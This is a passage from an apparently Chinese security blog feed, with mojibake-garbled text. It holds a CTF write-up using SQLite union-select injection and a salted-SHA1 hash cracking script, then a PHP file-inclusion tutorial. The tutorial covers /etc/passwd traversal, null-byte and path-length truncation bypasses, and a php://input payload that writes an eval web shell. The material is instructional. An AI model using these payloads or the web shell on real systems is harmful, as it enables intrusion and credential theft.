punctuation">,</span><span class="token string single-quoted-string">' '</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>................(HTML)</code></pre><p>å¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯<code>SQLite</code>æ•°æ®åº“ï¼Œå¹¶ä¸”å¯ç›´æ¥æŸ¥è¯¢ï¼Œæœªç»è¿‡è¿‡æ»¤ï¼Œä½†æ˜¯å¯†ç è¿›è¡Œäº†åŠ å¯†ï¼Œå…ˆçœ‹çœ‹é‡Œé¢æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œç½‘ä¸ŠæŸ¥<code>sqlite</code>çš„è¯­æ³•ï¼Œå’Œå…¶å®ƒæ•°æ®åº“å¤§åŒå°å¼‚ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>æŸ¥è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select name,name FROM sqlite_master WHERE type='</span><span class="token keyword">table</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+&amp;pw=111 </span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png" alt loading="lazy"></p><p>æŸ¥è¡¨ååŠå…¶å¯¹åº”çš„ç»“æ„ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select name,sql FROM sqlite_master WHERE type='</span><span class="token keyword">table</span>' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+&amp;pw=111</span></code></pre><p>å¾—åˆ°ï¼š<code>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code>ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª<code>hint</code>å­—æ®µ</p><p>å†å°†å†…å®¹æŸ¥è¯¢å‡ºæ¥ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> name<span class="token punctuation">,</span><span class="token punctuation">(</span>id<span class="token operator">/</span>name<span class="token operator">/</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> Users <span class="token keyword">limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">--+&amp;pw=111</span></code></pre><pre class="language-none"><code class="language-none">1,admin,3fab54a50e770d830c0416df817567662a9dc85c,my fav word in my fav paper?!2,fritze,54eae8935c90f467427f05e4ece82cf569f89507,my love isâ€¦?3,hansi,34b0bb7c304949f9ff2fc101eef0f048be10d3bd,the password is password</code></pre><p>è¡¨ä¸­åªæœ‰ä»¥ä¸Šä¸‰è¡Œå­—æ®µå†…å®¹ï¼Œæ ¹æ®<code>hint</code>å¯çŸ¥ï¼Œåº”è¯¥æ˜¯è¦åœ¨<code>fav paper</code>ä¸­æ‰¾åˆ°ä¸€ä¸ªè¯+<code>Salz</code>ä¹‹å<code>sha1</code>å¾—åˆ°çš„å€¼ä¸º<code>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</code>ï¼Œè¿™ä¸ªå•è¯åº”è¯¥å°±æ˜¯<code>admin</code>çš„å¯†ç ï¼Œåº”è¯¥å°±åœ¨å‰é¢çš„é‚£äº›<code>paper</code>çš„<code>pdf</code>æ–‡ä»¶é‡Œï¼Œäºæ˜¯ç”¨<code>wget</code>å‘½ä»¤å°†å…¶å…¨éƒ½ä¸‹è½½ä¸‹æ¥ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://124.126.19.106:43631/ -r -np -nd -A .pdf</code></pre><p>å†ç”¨è„šæœ¬éå†æ‰€æœ‰<code>pdf</code>æ–‡ä»¶ä¸­çš„å•è¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfinterp <span class="token keyword">import</span> PDFResourceManager<span class="token punctuation">,</span> PDFPageInterpreter<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>converter <span class="token keyword">import</span> TextConverter<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>layout <span class="token keyword">import</span> LAParams<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfpage <span class="token keyword">import</span> PDFPage<span class="token keyword">import</span> sys<span class="token keyword">import</span> string<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">get_pdf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">"../FlatScience/"</span> <span class="token operator">+</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"../FlatScience/"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"pdf"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">convert_pdf_2_text</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    rsrcmgr <span class="token operator">=</span> PDFResourceManager<span class="token punctuation">(</span><span class="token punctuation">)</span>    retstr <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    device <span class="token operator">=</span> TextConverter<span class="token punctuation">(</span>rsrcmgr<span class="token punctuation">,</span> retstr<span class="token punctuation">,</span> laparams<span class="token operator">=</span>LAParams<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    interpreter <span class="token operator">=</span> PDFPageInterpreter<span class="token punctuation">(</span>rsrcmgr<span class="token punctuation">,</span> device<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        <span class="token keyword">for</span> page <span class="token keyword">in</span> PDFPage<span class="token punctuation">.</span>get_pages<span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            interpreter<span class="token punctuation">.</span>process_page<span class="token punctuation">(</span>page<span class="token punctuation">)</span>        text <span class="token operator">=</span> retstr<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    device<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    retstr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">find_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_path <span class="token operator">=</span> get_pdf<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># print(pdf_path)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> pdf_path<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Searching word in "</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>        pdf_text <span class="token operator">=</span> convert_pdf_2_text<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> word <span class="token keyword">in</span> pdf_text<span class="token punctuation">:</span>            sha1_password <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">+</span> <span class="token string">"Salz!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> sha1_password <span class="token operator">==</span> <span class="token string">'3fab54a50e770d830c0416df817567662a9dc85c'</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the password :"</span> <span class="token operator">+</span> word<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    find_password<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ€åè·‘å‡º<code>password</code>ä¸º<code>ThinJerboa</code>ï¼Œåœ¨<code>admin.php</code>ç™»å½•å³å¯å¾—åˆ°<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«æ¼æ´å°ç»“</title>
      <link href="posts/73702816/"/>
      <url>posts/73702816/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ä»¶åŒ…å«ä½œç”¨å‡½æ•°ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">require</span><span class="token comment">//åŒ…å«è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ç›´æ¥é€€å‡ºç¨‹åº</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŒ…å«è¿‡ç¨‹å‡ºç°é”™è¯¯ï¼ŒæŠ›å‡ºè­¦å‘Šï¼Œç¨‹åºç»§ç»­è¿è¡Œ</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŒ…æ‹¬require()çš„åŠŸèƒ½ï¼Œä½†å‡½æ•°åªåŒ…å«ä¸€æ¬¡</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŒ…æ‹¬include()çš„åŠŸèƒ½ï¼Œä½†å‡½æ•°åªåŒ…å«ä¸€æ¬¡</span></code></pre><p>è¯¥å‡½æ•°ç”¨ä»¥åŠ è½½å¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„phpä»£ç ï¼Œå¹¶ä¸”å½“phpæ¥æ‰§è¡Œ</p><p>è€Œæ¼æ´äº§ç”Ÿçš„åŸå› åˆ™æ˜¯å› ä¸ºå½“å‡½æ•°ä¸­çš„å‚æ•°æœªç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä¸”ç”¨æˆ·å¯æ§æ—¶ï¼Œå½“ç”¨æˆ·åŒ…å«äº†å…¶å®ƒæ¶æ„æ–‡ä»¶ä»£ç ï¼Œå°±å¯¼è‡´æ‰§è¡Œäº†éé¢„æœŸæ“ä½œ</p><span id="more"></span><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>æ— é™åˆ¶ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>1.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315203414355.png" alt loading="lazy"></p><p>å¯ç”¨äºè¯»å–ç³»ç»Ÿå…¶å®ƒæ–‡ä»¶çš„å†…å®¹</p><p>ä¾‹å¦‚<code>2.php?a=../../../../../../../etc/passwd</code></p><p>æœ‰é™åˆ¶ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>1.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ç»•è¿‡æ–¹æ³•ï¼š</p><p><code>%00</code>æˆªæ–­ï¼Œæ¡ä»¶ï¼š<code>magic_quotes_gpc</code> = <code>Off</code>ï¼Œphpç‰ˆæœ¬&lt;<code>5.3.4</code></p><p>è·¯å¾„é•¿åº¦æˆªæ–­ï¼Œæ¡ä»¶ï¼šphpç‰ˆæœ¬&lt;<code>5.2.8</code></p><p>windows OS â€“&gt; åœ¨æ–‡ä»¶ååŠ ç‚¹ï¼Œç‚¹å·éœ€è¦é•¿äº256ï¼›linux OS â€“&gt; ç”¨<code>./</code>ï¼Œéœ€é•¿äº4096</p><blockquote><p>Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼›</p><p>Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚</p></blockquote><h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>æ— é™åˆ¶ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>1.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210218269.png" alt loading="lazy"></p><p>æœ‰é™åˆ¶ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>1.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>åœ¨æœ«å°¾åŠ ä¸Š<code>%3f</code>ï¼Œ<code>%23</code>ç»•è¿‡</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210124764.png" alt loading="lazy"></p><h3 id="PHPæ”¯æŒçš„åè®®å’Œå°è£…åè®®"><a href="#PHPæ”¯æŒçš„åè®®å’Œå°è£…åè®®" class="headerlink" title="PHPæ”¯æŒçš„åè®®å’Œå°è£…åè®®"></a>PHPæ”¯æŒçš„åè®®å’Œå°è£…åè®®</h3><h4 id="php-ä¼ªåè®®"><a href="#php-ä¼ªåè®®" class="headerlink" title="php://ä¼ªåè®®"></a>php://ä¼ªåè®®</h4><p><strong>æ¡ä»¶</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :ä»…<code>php://input php://stdin php://memory php://temp</code>éœ€è¦on</li></ul><p><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œå¸¸ä½¿ç”¨<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>å½“<code>enctype=&quot;multipart/form-data&quot;</code>æ—¶<code>php://input</code>æ— æ•ˆ</p><p>ç”¨æ³•<code>?file=php://input</code>ï¼Œåˆ©ç”¨POSTä¼ å…¥</p><p>åˆ©ç”¨<code>php://input</code>å†™é©¬ï¼ˆäº¦å¯å‘½ä»¤æ‰§è¡Œï¼‰ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è¦æ±‚ï¼šåŒæ—¶å¼€å¯ <code>allow_url_fopen</code> å’Œ <code>allow_url_include</code>ï¼ˆPHP &lt; 5.3.0ï¼‰å³å¯é€ æˆä»»æ„ä»£ç æ‰§è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212029230.png" alt loading="lazy"></p><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p><strong>ä½¿ç”¨</strong></p><p>ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„<a href="https://www.php.net/manual/zh/filters.php">ç­›é€‰è¿‡æ»¤</a>åº”ç”¨ã€‚</p><p>è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚å…·ä½“å‚è€ƒå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507163438086.png" alt loading="lazy"></p><p><strong>å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰</strong></p><table><thead><tr><th><strong>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>ç­‰åŒäº<code>str_rot13()</code>ï¼Œrot13å˜æ¢</td></tr><tr><td>string.toupper</td><td>ç­‰åŒäº<code>strtoupper()</code>ï¼Œè½¬å¤§å†™å­—æ¯</td></tr><tr><td>string.tolower</td><td>ç­‰åŒäº<code>strtolower()</code>ï¼Œè½¬å°å†™å­—æ¯</td></tr><tr><td>string.strip_tags</td><td>ç­‰åŒäº<code>strip_tags()</code>ï¼Œå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾</td></tr></tbody></table><table><thead><tr><th><strong>è½¬æ¢è¿‡æ»¤å™¨</strong></th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>ç­‰åŒäº<code>base64_encode()</code>å’Œ<code>base64_decode()</code>ï¼Œbase64ç¼–ç è§£ç </td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç </td></tr></tbody></table><table><thead><tr><th>å‹ç¼©è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td></tr></tbody></table><table><thead><tr><th><strong>åŠ å¯†è¿‡æ»¤å™¨</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³•</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt å¯¹ç§°è§£å¯†ç®—æ³•</td></tr></tbody></table><ol><li><code>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]</code>è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰</li><li><code>php://input + [POST DATA]</code>æ‰§è¡Œphpä»£ç </li></ol><p><strong>æ¼”ç¤º</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">.=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æˆåŠŸå†™é©¬</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507174823081.png" alt loading="lazy"></p><p><code>string.strip_tags</code>æ–¹æ³•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180043996.png" alt loading="lazy"></p><p><strong><a href="https://www.php.net/manual/zh/filters.string.strip_tags.php">string.strip_tags</a></strong>ï¼šä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ <code>strip_tags()</code>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œ <code>strip_tags()</code>å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚</p><p><strong><a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a></strong>ï¼šä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°</p><p><strong>ROT13</strong>æ–¹æ³•</p><p>ç¼–ç è§£ç ç½‘ç«™ï¼š<a href="https://cryptii.com/pipes/rot13-decoder">https://cryptii.com/pipes/rot13-decoder</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180852771.png" alt loading="lazy"></p><h4 id="file-ä¼ªåè®®"><a href="#file-ä¼ªåè®®" class="headerlink" title="file://ä¼ªåè®®"></a>file://ä¼ªåè®®</h4><p><strong>æ¡ä»¶</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul><p><strong>ç”¨æ³•</strong></p><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p><ol><li><strong>file://[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</strong>   <code>a=file://D:/phpstudy/WWW/test/1.php</code></li><li><strong>[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</strong>   <code>a=./1.php</code></li><li><strong>[httpï¼š//ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å]</strong>  <code>a=http://127.0.0.1/phpinfo.txt</code></li></ol><p><strong>æ¼”ç¤º</strong></p><pre class="language-php" data-language="php"><code class="language-php">2.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>1.phpä»£ç ï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img 